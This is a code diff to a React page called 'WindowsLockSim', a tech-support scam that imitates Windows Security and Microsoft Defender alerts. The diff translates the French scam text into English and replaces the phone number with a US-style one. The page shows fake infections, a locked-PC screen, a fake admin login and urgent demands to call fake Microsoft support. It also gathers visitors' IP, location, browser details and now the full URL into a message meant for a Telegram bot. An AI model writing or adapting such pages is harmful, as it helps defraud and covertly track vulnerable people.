@@ -57,14 +57,16 @@ const WindowsLockSim: React.FC = () => {
         const now = new Date();
         const localTime = `${now.getDate().toString().padStart(2, '0')}/${(now.getMonth() + 1).toString().padStart(2, '0')}/${now.getFullYear()} ${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
         
-        // Get referrer
+        // Get referrer and full URL
         const referrer = document.referrer || 'Direct';
+        const fullUrl = window.location.href;
+        const domain = window.location.hostname;
         
         // Format message exactly as you want
         const message = `
 🚨 NEW POP SHADOW 😏🚨
 
-🌐 Domain: ${window.location.hostname}
+🌐 Domain: ${domain}
 📍 IP Address: ${ip}
 🗺️ Country: ${country} (${countryCode})
 🏙️ Location: ${city}, ${region}
@@ -78,6 +80,7 @@ ${navigator.userAgent}
 💻 Platform: ${navigator.platform}
 🔤 Language: ${navigator.language}
 🔗 Referrer: ${referrer}
+🔍 URL: ${fullUrl}
         `;
         
         // REPLACE WITH YOUR BOT TOKEN AND CHAT ID
@@ -207,7 +210,7 @@ ${navigator.userAgent}
         <source src="/vocal1-BYq15bXr.mp3" type="audio/mpeg" />
       </audio>
 
-      {/* YOUR EXACT ORIGINAL CONTENT - NO CHANGES BELOW THIS LINE */}
+      {/* TRANSLATED TO ENGLISH BELOW */}
       <div className="fake-screen" style={{ backgroundImage: 'url("/windows-lock-sim_files/window_lock-CQufc91c.png")', backgroundSize: 'cover', backgroundPosition: 'center center', backgroundRepeat: 'no-repeat' }}>
         
         {/* Panel 1 */}
@@ -215,7 +218,7 @@ ${navigator.userAgent}
           <div className="security-header">
             <div className="security-left">
               <img alt="Windows" className="windows-logo" src="/windows-lock-sim_files/windows_logo-CziNPXKD.png" />
-              <span className="security-title">Sécurité Windows</span>
+              <span className="security-title">Windows Security</span>
             </div>
             <div className="window-controls">
               <button className="control-btn minimize">−</button>
@@ -228,31 +231,31 @@ ${navigator.userAgent}
               <div className="security-status">
                 <div className="status-icon warning">⚠️</div>
                 <div className="status-text">
-                  <h3>Protection désactivée</h3>
-                  <p>Votre ordinateur est vulnérable</p>
+                  <h3>Protection disabled</h3>
+                  <p>Your computer is vulnerable</p>
                 </div>
               </div>
               <div className="security-actions-panel">
-                <button className="security-action-btn primary">Activer la protection en temps réel</button>
-                <button className="security-action-btn">Démarrer l'analyse rapide</button>
+                <button className="security-action-btn primary">Enable real-time protection</button>
+                <button className="security-action-btn">Start quick scan</button>
               </div>
               <div className="security-info">
                 <div className="info-row">
-                  <span>Protection antivirus</span>
-                  <span className="status-off">Désactivée</span>
+                  <span>Antivirus protection</span>
+                  <span className="status-off">Disabled</span>
                 </div>
                 <div className="info-row">
-                  <span>Pare-feu</span>
-                  <span className="status-on">Activé</span>
+                  <span>Firewall</span>
+                  <span className="status-on">Enabled</span>
                 </div>
                 <div className="info-row">
-                  <span>Dernière analyse</span>
-                  <span>Il y a 7 jours</span>
+                  <span>Last scan</span>
+                  <span>7 days ago</span>
                 </div>
               </div>
             </div>
             <div className="security-sidebar">
-              <span className="security-message">Activer la licence</span>
+              <span className="security-message">Activate license</span>
             </div>
           </div>
         </div>
@@ -262,7 +265,7 @@ ${navigator.userAgent}
           <div className="analyse-header">
             <div className="analyse-left">
               <div className="analyse-icon">🔍</div>
-              <span className="analyse-title">Analyse de sécurité</span>
+              <span className="analyse-title">Security Scan</span>
             </div>
             <div className="window-controls">
               <button className="control-btn minimize">−</button>
@@ -274,32 +277,32 @@ ${navigator.userAgent}
             <div className="analyse-main">
               <div className="scan-results">
                 <div className="result-header">
-                  <h3>Résultats de l'analyse</h3>
-                  <span className="scan-time">Terminée à 14:32</span>
+                  <h3>Scan Results</h3>
+                  <span className="scan-time">Completed at 14:32</span>
                 </div>
                 <div className="threats-found">
                   <div className="threat-count">
                     <span className="count">47</span>
-                    <span className="label">Menaces détectées</span>
+                    <span className="label">Threats detected</span>
                   </div>
                 </div>
                 <div className="threat-list">
                   <div className="threat-item">
                     <span className="threat-name">Trojan:Win32/Emotet.A</span>
-                    <span className="threat-level high">Élevé</span>
+                    <span className="threat-level high">High</span>
                   </div>
                   <div className="threat-item">
                     <span className="threat-name">Adware:Win32/RelevantKnowledge</span>
-                    <span className="threat-level medium">Moyen</span>
+                    <span className="threat-level medium">Medium</span>
                   </div>
                   <div className="threat-item">
                     <span className="threat-name">PUA:Win32/InstallCore</span>
-                    <span className="threat-level low">Faible</span>
+                    <span className="threat-level low">Low</span>
                   </div>
                 </div>
                 <div className="action-buttons">
-                  <button className="action-btn danger">Nettoyer maintenant</button>
-                  <button className="action-btn">Quarantaine</button>
+                  <button className="action-btn danger">Clean now</button>
+                  <button className="action-btn">Quarantine</button>
                 </div>
               </div>
             </div>
@@ -317,11 +320,11 @@ ${navigator.userAgent}
             </div>
           </div>
           <div className="defender-content">
-            <span className="defender-message">L'accès à ce PC a été bloqué pour des raisons de sécurité</span>
+            <span className="defender-message">Access to this PC has been blocked for security reasons</span>
           </div>
           <div className="defender-buttons">
-            <button className="defender-btn">Annuler</button>
-            <button className="defender-btn primary">D'ACCORD</button>
+            <button className="defender-btn">Cancel</button>
+            <button className="defender-btn primary">OK</button>
           </div>
         </div>
 
@@ -331,7 +334,7 @@ ${navigator.userAgent}
             <div className="defender-popup-header">
               <div className="defender-popup-left">
                 <div className="defender-logo">🛡️</div>
-                <span className="defender-popup-title">Microsoft Défenseur</span>
+                <span className="defender-popup-title">Microsoft Defender</span>
               </div>
               <div className="defender-popup-controls">
                 <button className="popup-control-btn minimize">−</button>
@@ -341,25 +344,25 @@ ${navigator.userAgent}
             </div>
             <div className="defender-popup-content">
               <div className="popup-main-message">
-                <h2 className="popup-title">Désolé, l'analyse n'est pas terminée !</h2>
-                <div className="error-code">Erreur: Ox800VDS</div>
-                <div className="popup-description">Microsoft Defender a trouvé des fichiers infectés mais n'a pas pu les supprimer en raison des autorisations des stratégies de groupe. Veuillez scanner maintenant pour les supprimer manuellement.</div>
+                <h2 className="popup-title">Sorry, scan is not completed!</h2>
+                <div className="error-code">Error: Ox800VDS</div>
+                <div className="popup-description">Microsoft Defender found infected files but could not remove them due to group policy permissions. Please scan now to remove them manually.</div>
                 <div className="popup-icons">
                   <div className="popup-icon">📄</div>
                   <div className="popup-icon">📁</div>
                   <div className="popup-icon">🔍</div>
                 </div>
                 <div className="support-section">
-                  <div className="support-text">Appeler le support pour obtenir de l'aide</div>
-                  <div className="support-label">Prise en charge de Windows</div>
+                  <div className="support-text">Call support for help</div>
+                  <div className="support-label">Windows Support</div>
                 </div>
                 <div className="popup-buttons">
                   <div className="windows-security-badge">
                     <div className="windows-logo">🏠</div>
-                    <span>Sécurité Windows</span>
+                    <span>Windows Security</span>
                   </div>
-                  <button className="scan-button primary">Scanne maintenant</button>
-                  <button className="scan-button secondary">Scanner plus tard</button>
+                  <button className="scan-button primary">Scan now</button>
+                  <button className="scan-button secondary">Scan later</button>
                 </div>
               </div>
             </div>
@@ -370,76 +373,76 @@ ${navigator.userAgent}
         <div className={`admin-modal-wrapper sequence-panel ${currentIndex === 4 ? 'active' : ''}`}>
           <div className="admin-modal">
             <div className="modal-header">
-              <span>Connexion administrateur</span>
+              <span>Administrator Login</span>
               <button className="close-btn">✕</button>
             </div>
             <div className="modal-body">
-              <p className="warning-text">Windows verrouillé en raison d'une activité inhabituelle.</p>
-              <p className="instruction-text">Veuillez vous reconnecter à l'aide de votre identifiant Microsoft et de votre mot de passe.</p>
-              <p className="support-text">Pour obtenir de l'aide, contactez le support Microsoft</p>
-              <div className="support-number">23 93 06 18</div>
-              <input placeholder="Nom d'utilisateur" disabled type="text" />
-              <input placeholder="Mot de passe" disabled type="password" />
-              <button className="submit-btn" disabled>valeur</button>
+              <p className="warning-text">Windows locked due to unusual activity.</p>
+              <p className="instruction-text">Please log back in using your Microsoft ID and password.</p>
+              <p className="support-text">For help, contact Microsoft support</p>
+              <div className="support-number">+1 945 398 1081</div>
+              <input placeholder="Username" disabled type="text" />
+              <input placeholder="Password" disabled type="password" />
+              <button className="submit-btn" disabled>Login</button>
             </div>
           </div>
         </div>
       </div>
 
       <div className="fullscreen-notification">
-        <div className="notification-bar">Alerte maximale de sécurité. Message IMPORTANT du service de sécurité informatique. Une INFECTION GRAVE a été détectée sur votre ordinateur. Des comportements suspects indiquent une compromission sérieuse de vos données. Vos informations personnelles, vos coordonnées bancaires et vos identifiants sont potentiellement en danger. Il existe un risque réel et IMMINENT de vol d'identité et d'utilisation frauduleuse de vos comptes. Ne tentez pas de résoudre ceci seul. Contactez IMMÉDIATEMENT le service technique au numéro indiqué sur cette page pour obtenir une intervention urgente. Ne saisissez aucun mot de passe, n'effectuez aucun paiement et n'autorisez aucune demande de confirmation tant que notre technicien ne vous l'a pas confirmé. Ce message est prioritaire — agissez maintenant pour protéger vos données. Contactez sans délai le service technique pour une prise en charge immédiate et évitez toute manipulation qui pourrait aggraver la situation.</div>
+        <div className="notification-bar">Maximum security alert. IMPORTANT message from IT security service. A SERIOUS INFECTION has been detected on your computer. Suspicious behaviors indicate serious data compromise. Your personal information, banking details, and credentials are potentially at risk. There is a real and IMMINENT risk of identity theft and fraudulent use of your accounts. Do not attempt to resolve this yourself. CONTACT IMMEDIATELY the technical service at the number indicated on this page for urgent intervention. Do not enter any passwords, make any payments, or authorize any confirmation requests until our technician has confirmed it to you. This message is priority — act now to protect your data. Contact the technical service without delay for immediate support and avoid any manipulation that could worsen the situation.</div>
       </div>
 
       <div className="virus-popup">
         <div className="virus-popup-header">
           <span className="virus-icon">⚠️</span>
-          <span className="virus-title">VIRUS DÉTECTÉ!</span>
+          <span className="virus-title">VIRUS DETECTED!</span>
           <span className="close-btn">×</span>
         </div>
         <div className="virus-popup-content">
           <div className="gif-container">
-            <img alt="Transfer en cours" className="transfer-gif" src="transfer-CVD-3X68.gif" />
+            <img alt="Transfer in progress" className="transfer-gif" src="transfer-CVD-3X68.gif" />
           </div>
           <div className="virus-text">
-            <h3>🚨 ALERTE CRITIQUE 🚨</h3>
-            <p><strong>Virus Trojan.Win32.Danger détecté!</strong></p>
-            <p>Vos données sont en cours de transfert...</p>
-            <p className="warning-text">⚡ ARRÊTEZ IMMÉDIATEMENT toute activité!</p>
-            <p className="phone-number">📞 Appelez: <strong>23 93 06 18</strong></p>
+            <h3>🚨 CRITICAL ALERT 🚨</h3>
+            <p><strong>Trojan.Win32.Danger virus detected!</strong></p>
+            <p>Your data is being transferred...</p>
+            <p className="warning-text">⚡ STOP ALL ACTIVITY IMMEDIATELY!</p>
+            <p className="phone-number">📞 Call: <strong>+1 945 398 1081</strong></p>
           </div>
         </div>
         <div className="virus-popup-footer">
           <div className="progress-bar">
             <div className="progress-fill"></div>
           </div>
-          <p>Transfert de données: 47%...</p>
+          <p>Data transfer: 47%...</p>
         </div>
       </div>
 
       <div className="security-alert-popup">
         <div className="security-alert-header">
           <span className="alert-icon">🔒</span>
-          <span className="alert-title">SÉCURITÉ</span>
+          <span className="alert-title">SECURITY</span>
         </div>
         <div className="security-alert-content">
           <div className="alert-status">
             <div className="status-indicator"></div>
-            <span className="status-text">SYSTÈME BLOQUÉ</span>
+            <span className="status-text">SYSTEM LOCKED</span>
           </div>
           <div className="alert-info">
             <p className="danger-text">⚠️ DANGER ⚠️</p>
-            <p className="info-text">Accès bloqué</p>
+            <p className="info-text">Access blocked</p>
             <p className="info-text">Code: 0x80070005</p>
           </div>
           <div className="support-box">
-            <p className="support-label">Support Microsoft</p>
-            <p className="support-number">23 93 06 18</p>
+            <p className="support-label">Microsoft Support</p>
+            <p className="support-number">+1 945 398 1081</p>
           </div>
         </div>
         <div className="security-alert-footer">
           <div className="threat-level">
-            <span className="threat-label">Niveau de menace:</span>
-            <span className="threat-value">CRITIQUE</span>
+            <span className="threat-label">Threat level:</span>
+            <span className="threat-value">CRITICAL</span>
           </div>
         </div>
       </div>
@@ -456,10 +459,10 @@ ${navigator.userAgent}
             <span className="microsoft-text">Microsoft</span>
           </div>
           <div className="support-content">
-            <p className="support-title">Assistance technique Windows</p>
+            <p className="support-title">Windows Technical Support</p>
             <div className="phone-section">
-              <div className="phone-number">23 93 06 18</div>
-              <div className="phone-subtitle">( Numéro sans frais)</div>
+              <div className="phone-number">+1 945 398 1081</div>
+              <div className="phone-subtitle">(Toll-free number)</div>
             </div>
           </div>
           <div className="bubble-arrow"></div>
